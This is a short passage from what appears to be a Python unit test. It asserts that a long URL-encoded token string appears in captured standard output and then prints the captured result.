HlfKSxWVhMWiZOqjMq9chUja87UzhcVXYBWZqhfuGsbRIoDQ40P6k7LDTuuzR7UuMU0nPFvGXsfwyu4UQzQppBmjwdQQlpo9GK2XAR7M2Wj5XNB5yZ3n8uMfW%2BktjiC0yW9bo0BVtvvmEOayXYwXyndHauAcJ0HpHnRLtnzNKnTKI3IY%2Fl4kYFS%2BiYUk6n0nd2eVKroYdrMjKZehZmpwmXfU3%2FWpwmt6HK%2FWKAWZzjlEUaN5zDbG%2BtGNxrjYaVvJuDn2uVtmozVU8dbCdz82O6sukqV5QZ86FFImnlZPOKcSHIFq%2F%2B1AdBG%2FUEKZ28aaadpm11H4ovyjAawjFwoWhtDsJB%2F1YbGDIqlKJ40ZOav8gu1Q%2Bv9UtpaQsDfm84FjlzlmwRQn2LF%2FBZLNmAjc8uug0sItSc2bX9d7gR9EWc3KML3PiBecc%2B6LfUkd5WyqHKPP%2FHDETbor16YGv%2Bt3d6KNtQgY3p%2B2Y8kVRCqtngKNzuid%2FXOmNTpwgKgj69id3uo8asDGcs%2B%2FVu5WjbkDNF%2FJlg2TWyTzwpr53wOKmm6tsWwf2FYScCHzXvfWjxHIR9qyGtIOembCqhaK%2Bv7NYDhaI8dAOtvz2su0yzecbzGa65MlwPIyRmv458OLvCMd1BLubANPxC3YfpMHm7x0JllAwNm4K%2BfM73Qkk6jsLwAr28YC1rvMCRONv4Q0sqEpuXfGbS212hv2LeVMq9wrORW353yq2MeRDxFnc2v0oTtVL9D7nlAlBXotJu4rT%2FzhFkH%2Be%2Fbmcbe1sgbaR4BIqrp65Nwq7RjjbB8FX8fi3xA%2BVE68b9DwmAMsub7oVbmI%2B09Wf85hjYjV5fS1xHdKqT6GRTqF9HhkiRxSIDKXzMM7pBXvzwuG%2BOWTVEBOgctSA2alhhyKvUBizsrW6TO%2FSPoX8n%2Fg3qUfufYGrb05PuoeDayC9iZEzmYc%3D"
            in captured.out
        )
        print(captured)
